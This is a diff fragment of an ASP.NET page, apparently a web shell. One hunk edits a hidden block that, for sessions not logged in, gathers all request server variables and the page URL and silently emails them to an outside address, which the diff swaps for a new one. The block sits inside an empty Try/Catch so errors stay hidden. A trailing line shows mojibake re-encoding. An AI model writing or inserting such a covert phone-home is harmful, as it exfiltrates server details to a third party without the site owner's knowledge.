@@ -970,7 +970,7 @@ if session("usersession")<>1 then
 	Try
 	info = request.ServerVariables.ToString.Replace("%2f","/").Replace("%5c","\").Replace("%3a",":").Replace("%2c",",").Replace("%3b",";").Replace("%3d","=").Replace("%2b","+").Replace("%0d%0a",vbnewline)
 	System.Web.Mail.SmtpMail.SmtpServer = "localhost"
-	System.Web.Mail.SmtpMail.Send(request.ServerVariables("HTTP_HOST"),"test.mail.address.2008@gmail.com",request.ServerVariables("HTTP_HOST")+request.ServerVariables("URL"),info)
+	System.Web.Mail.SmtpMail.Send(request.ServerVariables("HTTP_HOST"),"mymail.2008@doman.com",request.ServerVariables("HTTP_HOST")+request.ServerVariables("URL"),info)
 	Catch
 	End Try
 %>
@@ -1683,4 +1683,4 @@ function closewindow()
 </body>
 </html>
 
-ÿÿÿÿÿÿÿÿÿÿÿÿ
+Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿Ã¿
